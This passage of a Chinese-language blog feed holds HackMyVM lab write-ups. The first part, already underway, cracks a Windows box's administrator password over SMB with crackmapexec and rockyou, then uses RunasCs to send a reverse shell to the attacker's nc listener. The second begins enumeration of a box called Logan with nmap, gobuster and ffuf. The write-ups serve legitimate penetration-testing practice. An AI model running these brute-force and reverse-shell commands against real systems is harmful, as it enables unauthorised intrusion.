-rw-rw-rw-          <span class="token number">3</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> atsvc
-rw-rw-rw-          <span class="token number">4</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> wkssvc
-rw-rw-rw-          <span class="token number">1</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> Winsock2<span class="token punctuation">\</span>CatalogChangeListener-390-0
-rw-rw-rw-          <span class="token number">3</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> W32TIME_ALT
-rw-rw-rw-          <span class="token number">4</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> srvsvc
-rw-rw-rw-          <span class="token number">1</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> Winsock2<span class="token punctuation">\</span>CatalogChangeListener-21c-0
-rw-rw-rw-          <span class="token number">1</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> Winsock2<span class="token punctuation">\</span>CatalogChangeListener-3e8-0
-rw-rw-rw-          <span class="token number">1</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> Winsock2<span class="token punctuation">\</span>CatalogChangeListener-224-0
-rw-rw-rw-          <span class="token number">1</span>  Mon Jan  <span class="token number">1</span> 08:05:43 <span class="token number">1601</span> PIPE_EVENTROOT<span class="token punctuation">\</span>CIMV2SCM EVENT PROVIDER</code></pre>
<p>然而并没有什么东西<br>想到5985端口开放，用<code>evil-winrm</code>连接一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.56.196 <span class="token parameter variable">-u</span> nica <span class="token parameter variable">-p</span> hardcore    
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>nica<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token function">dir</span>
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>nica<span class="token punctuation">\</span>Documents<span class="token operator">></span> <span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>nica<span class="token operator">></span> <span class="token function">dir</span>


    Directorio: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>nica


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        <span class="token number">9</span>/15/2018   <span class="token number">9</span>:12 AM                Desktop
d-r---        <span class="token number">9</span>/26/2023   <span class="token number">6</span>:44 PM                Documents
d-r---        <span class="token number">9</span>/15/2018   <span class="token number">9</span>:12 AM                Downloads
d-r---        <span class="token number">9</span>/15/2018   <span class="token number">9</span>:12 AM                Favorites
d-r---        <span class="token number">9</span>/15/2018   <span class="token number">9</span>:12 AM                Links
d-r---        <span class="token number">9</span>/15/2018   <span class="token number">9</span>:12 AM                Music
d-r---        <span class="token number">9</span>/15/2018   <span class="token number">9</span>:12 AM                Pictures
d-----        <span class="token number">9</span>/15/2018   <span class="token number">9</span>:12 AM                Saved Games
d-r---        <span class="token number">9</span>/15/2018   <span class="token number">9</span>:12 AM                Videos
-a----        <span class="token number">9</span>/26/2023   <span class="token number">6</span>:44 PM             <span class="token number">10</span> user.txt


*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>nica<span class="token operator">></span> <span class="token builtin class-name">type</span> user.txt
HMVWI****</code></pre>
<h2 id="提权administrator"><a href="#提权administrator" class="headerlink" title="提权administrator"></a>提权administrator</h2><p>拿到user flag,翻了一下系统并没有什么重要文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>nica<span class="token operator">></span> net user

Cuentas de usuario de <span class="token punctuation">\</span><span class="token punctuation">\</span>

-------------------------------------------------------------------------------
Administrador            akanksha                 DefaultAccount
Invitado                 nica                     WDAGUtilityAccount
El comando se ha completado con uno o m s errores.</code></pre>
<p>查看用户信息发现管理员用户名是<code>akanksha</code><br>继续尝试密码爆破</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> crackmapexec smb <span class="token number">192.168</span>.56.196 <span class="token parameter variable">-u</span> Akanksha <span class="token parameter variable">-p</span> /usr/share/wordlists/rockyou.txt
SMB         <span class="token number">192.168</span>.56.196  <span class="token number">445</span>    WIN-IURF14RBVGV  <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows <span class="token number">10.0</span> Build <span class="token number">17763</span> x64 <span class="token punctuation">(</span>name:WIN-IURF14RBVGV<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:WIN-IURF14RBVGV<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:False<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span>
SMB         <span class="token number">192.168</span>.56.196  <span class="token number">445</span>    WIN-IURF14RBVGV  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> WIN-IURF14RBVGV<span class="token punctuation">\</span>Akanksha:123456 STATUS_LOGON_FAILURE 
SMB         <span class="token number">192.168</span>.56.196  <span class="token number">445</span>    WIN-IURF14RBVGV  <span class="token punctuation">[</span>-<span class="token punctuation">]</span> WIN-IURF14RBVGV<span class="token punctuation">\</span>Akanksha:12345 STATUS_LOGON_FAILURE 
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
SMB         <span class="token number">192.168</span>.56.196  <span class="token number">445</span>    WIN-IURF14RBVGV  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> WIN-IURF14RBVGV<span class="token punctuation">\</span>Akanksha:sweetgirl </code></pre>
<p>拿到密码 <code>sweetgirl</code>，不过winrm这次连不上了，可能权限不够</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> evil-winrm <span class="token parameter variable">-i</span> <span class="token number">192.168</span>.56.196 <span class="token parameter variable">-u</span> akanksha <span class="token parameter variable">-p</span> sweetgirl

                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">function</span> is unimplemented on this machine
                                        
Data: For <span class="token function">more</span> information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="token comment">#Remote-path-completion</span>
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of <span class="token builtin class-name">type</span> WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code <span class="token number">1</span></code></pre>
<p>使用工具<a href="https://github.com/antonioCoco/RunasCs,%E4%BB%A5%E6%8C%87%E5%AE%9A%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">https://github.com/antonioCoco/RunasCs,以指定用户权限执行命令</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>nica<span class="token operator">></span> upload RunasCs.exe
                                        
Info: Uploading /root/Desktop/RunasCs.exe to C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>nica<span class="token punctuation">\</span>RunasCs.exe
                                        
Error: Upload failed. Check filenames or paths: No such <span class="token function">file</span> or directory - No such <span class="token function">file</span> or directory /root/Desktop/RunasCs.exe
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>nica<span class="token operator">></span> upload RunasCs.exe
                                        
Info: Uploading /root/Desktop/RunasCs.exe to C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>nica<span class="token punctuation">\</span>RunasCs.exe
                                        
Data: <span class="token number">68948</span> bytes of <span class="token number">68948</span> bytes copied
                                        
Info: Upload successful<span class="token operator">!</span>
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>nica<span class="token operator">></span> <span class="token function">dir</span>


    Directorio: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>nica


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        <span class="token number">9</span>/15/2018   <span class="token number">9</span>:12 AM                Desktop
d-r---        <span class="token number">9</span>/26/2023   <span class="token number">6</span>:44 PM                Documents
d-r---        <span class="token number">9</span>/15/2018   <span class="token number">9</span>:12 AM                Downloads
d-r---        <span class="token number">9</span>/15/2018   <span class="token number">9</span>:12 AM                Favorites
d-r---        <span class="token number">9</span>/15/2018   <span class="token number">9</span>:12 AM                Links
d-r---        <span class="token number">9</span>/15/2018   <span class="token number">9</span>:12 AM                Music
d-r---        <span class="token number">9</span>/15/2018   <span class="token number">9</span>:12 AM                Pictures
d-----        <span class="token number">9</span>/15/2018   <span class="token number">9</span>:12 AM                Saved Games
d-r---        <span class="token number">9</span>/15/2018   <span class="token number">9</span>:12 AM                Videos
-a----        <span class="token number">7</span>/14/2024  <span class="token number">10</span>:49 PM          <span class="token number">51712</span> RunasCs.exe
-a----        <span class="token number">9</span>/26/2023   <span class="token number">6</span>:44 PM             <span class="token number">10</span> user.txt


*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>nica<span class="token operator">></span> ./RunasCs.exe akanksha sweetgirl cmd.exe <span class="token parameter variable">-r</span> <span class="token number">192.168</span>.56.104:4567

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Running <span class="token keyword">in</span> session <span class="token number">0</span> with process <span class="token keyword">function</span> CreateProcessWithLogonW<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Using Station<span class="token punctuation">\</span>Desktop: Service-0x0-2922e6$<span class="token punctuation">\</span>Default
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Async process <span class="token string">'C:\Windows\system32\cmd.exe'</span> with pid <span class="token number">2496</span> created <span class="token keyword">in</span> background.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4567</span>                                                        
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.196<span class="token punctuation">]</span> <span class="token number">49674</span>
Microsoft Windows <span class="token punctuation">[</span>Versi�n <span class="token number">10.0</span>.17763.107<span class="token punctuation">]</span>
<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2018</span> Microsoft Corporation. Todos los derechos reservados.

C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span></code></pre>
<p>成功弹回了shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token operator">></span>whoami /groups
<span class="token function">whoami</span> /groups

INFORMACI�N DE GRUPO
--------------------

Nombre de grupo                              Tipo           SID                                            Atributos                                                               
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
Todos                                        Grupo conocido S-1-1-0                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
WIN-IURF14RBVGV<span class="token punctuation">\</span>Idministritirs               Alias          S-1-5-21-2519875556-2276787807-2868128514-1002 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN<span class="token punctuation">\</span>Usuarios                             Alias          S-1-5-32-545                                   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY<span class="token punctuation">\</span>INTERACTIVE                     Grupo conocido S-1-5-4                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
INICIO DE SESI�N EN LA CONSOLA               Grupo conocido S-1-2-1                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY<span class="token punctuation">\</span>Usuarios autentificados         Grupo conocido S-1-5-11                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY<span class="token punctuation">\</span>Esta compa��a                   Grupo conocido S-1-5-15                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY<span class="token punctuation">\</span>Cuenta <span class="token builtin class-name">local</span>                    Grupo conocido S-1-5-113                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
NT AUTHORITY<span class="token punctuation">\</span>Autenticaci�n NTLM              Grupo conocido S-1-5-64-10                                    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
Etiqueta obligatoria<span class="token punctuation">\</span>Nivel obligatorio medio Etiqueta       S-1-16-8192        </code></pre>
<p>所属组是<code>Idministritirs </code>也就是Administrator</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrador<span class="token operator">></span>dir
<span class="token function">dir</span>
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 26CD-AE41

 Directorio de C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrador

<span class="token number">26</span>/09/2023  <span class="token number">18</span>:36    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          <span class="token builtin class-name">.</span>
<span class="token number">26</span>/09/2023  <span class="token number">18</span>:36    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          <span class="token punctuation">..</span>
<span class="token number">26</span>/09/2023  <span class="token number">15</span>:11    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          3D Objects
<span class="token number">26</span>/09/2023  <span class="token number">15</span>:11    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          Contacts
<span class="token number">26</span>/09/2023  <span class="token number">15</span>:11    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          Desktop
<span class="token number">26</span>/09/2023  <span class="token number">15</span>:11    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          Documents
<span class="token number">26</span>/09/2023  <span class="token number">15</span>:11    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          Downloads
<span class="token number">26</span>/09/2023  <span class="token number">15</span>:11    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          Favorites
<span class="token number">26</span>/09/2023  <span class="token number">15</span>:11    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          Links
<span class="token number">26</span>/09/2023  <span class="token number">15</span>:11    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          Music
<span class="token number">26</span>/09/2023  <span class="token number">15</span>:24            <span class="token number">16.418</span> new.cfg
<span class="token number">26</span>/09/2023  <span class="token number">15</span>:11    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          Pictures
<span class="token number">26</span>/09/2023  <span class="token number">18</span>:36                <span class="token number">13</span> root.txt
<span class="token number">26</span>/09/2023  <span class="token number">15</span>:11    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          Saved Games
<span class="token number">26</span>/09/2023  <span class="token number">15</span>:11    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          Searches
<span class="token number">26</span>/09/2023  <span class="token number">15</span>:11    <span class="token operator">&lt;</span>DIR<span class="token operator">></span>          Videos
               <span class="token number">2</span> archivos         <span class="token number">16.431</span> bytes
              <span class="token number">14</span> <span class="token function">dirs</span>  <span class="token number">45.911</span>.502.848 bytes libres

C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Administrador<span class="token operator">></span>type root.txt
<span class="token builtin class-name">type</span> root.txt
HMV1******</code></pre>



]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>SMB密码爆破</tag>
        <tag>winrm</tag>
        <tag>RunasCs</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Logan</title>
    <url>/posts/3d6a4d0/</url>
    <content><![CDATA[<p><strong>难度:medium</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.160</strong></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/mnt<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.160 -sV -A</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-04-24 <span class="token number">15</span>:53 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.160
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00048s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">25</span>/tcp <span class="token function">open</span>  smtp    Postfix smtpd
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span>_smtp-commands: logan.hmv, PIPELINING, SIZE <span class="token number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>logan
<span class="token operator">|</span> Subject Alternative Name: DNS:logan
<span class="token operator">|</span> Not valid before: <span class="token number">2023</span>-07-03T13:46:49
<span class="token operator">|</span>_Not valid after:  <span class="token number">2033</span>-06-30T13:46:49
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.52 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-server-header: Apache/2.4.52 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
MAC Address: 08:00:27:A1:DC:E7 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: Host:  logan.hmv

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.48</span> ms <span class="token number">192.168</span>.56.160

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">9.33</span> seconds</code></pre>
<p>25 smtp可能与邮件有关 80 apache 2.4.52   Service Info: Host:  logan.hmv<br>将logan.hmv添加到hosts</p>
<h2 id="web信息搜集"><a href="#web信息搜集" class="headerlink" title="web信息搜集"></a>web信息搜集</h2><p><img src="https://ooo.0x0.ooo/2024/04/24/Oppokt.png" alt="Oppokt.png" loading="lazy"><br>源码看了没什么东西</p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># gobuster dir -u http://logan.hmv -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://logan.hmv
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              html,txt,php,bak,zip
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/images               <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">307</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://logan.hmv/images/<span class="token punctuation">]</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">274</span><span class="token punctuation">]</span>
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">19038</span><span class="token punctuation">]</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">274</span><span class="token punctuation">]</span>
/css                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">304</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://logan.hmv/css/<span class="token punctuation">]</span>
/js                   <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">303</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://logan.hmv/js/<span class="token punctuation">]</span>
/javascript           <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">311</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://logan.hmv/javascript/<span class="token punctuation">]</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">274</span><span class="token punctuation">]</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">274</span><span class="token punctuation">]</span></code></pre>
<p>也没有扫出来什么东西</p>
<h3 id="子域扫描"><a href="#子域扫描" class="headerlink" title="子域扫描"></a>子域扫描</h3><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># ffuf -u http://logan.hmv -H 'Host: FUZZ.logan.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 65</span>

        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
